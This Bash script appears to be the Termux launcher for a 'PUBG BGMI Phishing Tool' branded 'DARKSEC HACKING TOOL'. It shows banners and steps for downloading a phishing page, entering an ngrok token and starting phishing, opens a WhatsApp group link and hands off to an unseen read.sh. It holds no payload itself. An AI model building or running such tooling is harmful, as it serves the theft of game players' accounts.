#!/bin/bash
echo ""
clear
echo ""

logo() {
echo -e ""
echo -e "\e[33m

 ██▓███   █    ██  ▄▄▄▄     ▄████ 
▓██░  ██▒ ██  ▓██▒▓█████▄  ██▒ ▀█▒
▓██░ ██▓▒▓██  ▒██░▒██▒ ▄██▒██░▄▄▄░
▒██▄█▓▒ ▒▓▓█  ░██░▒██░█▀  ░▓█  ██▓
▒██▒ ░  ░▒▒█████▓ ░▓█  ▀█▓░▒▓███▀▒
▒▓▒░ ░  ░░▒▓▒ ▒ ▒ ░▒▓███▀▒ ░▒   ▒ 
░▒ ░     ░░▒░ ░ ░ ▒░▒   ░   ░   ░ 
░░        ░░░ ░ ░  ░    ░ ░ ░   ░ 
            ░      ░            ░ 
                        ░         
         ▄▄▄▄     ▄████  ███▄ ▄███▓ ██▓   
        ▓█████▄  ██▒ ▀█▒▓██▒▀█▀ ██▒▓██▒   
        ▒██▒ ▄██▒██░▄▄▄░▓██    ▓██░▒██▒   
        ▒██░█▀  ░▓█  ██▓▒██    ▒██ ░██░   
        ░▓█  ▀█▓░▒▓███▀▒▒██▒   ░██▒░██░   
        ░▒▓███▀▒ ░▒   ▒ ░ ▒░   ░  ░░▓     
        ▒░▒   ░   ░   ░ ░  ░      ░ ▒ ░   
         ░    ░ ░ ░   ░ ░      ░    ▒ ░   
         ░            ░        ░    ░     
              ░                           
  \e[0m\n"
}

logo2() {
echo -e ""
echo -e "\e[92m 
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
     ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
     ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
     ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
  echo""
  
  }
  



echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!          Follow Step by Step         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo ""
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
echo ""
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Link Services  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Phishing Page File  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
sleep 5
clear
echo ""
echo ""
echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Script for Android \e[m \e[21"
echo ""
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       WELCOME TO DARKSEC HACKING TOOL  !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo ""
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to continue : \e[0m' option
echo""
echo""
echo ""
termux-open-url https://chat.whatsapp.com/EvPB1EwiWxRDVmOPLXEs5V
echo ""
clear
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!             KEY REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
bash read.sh
clear
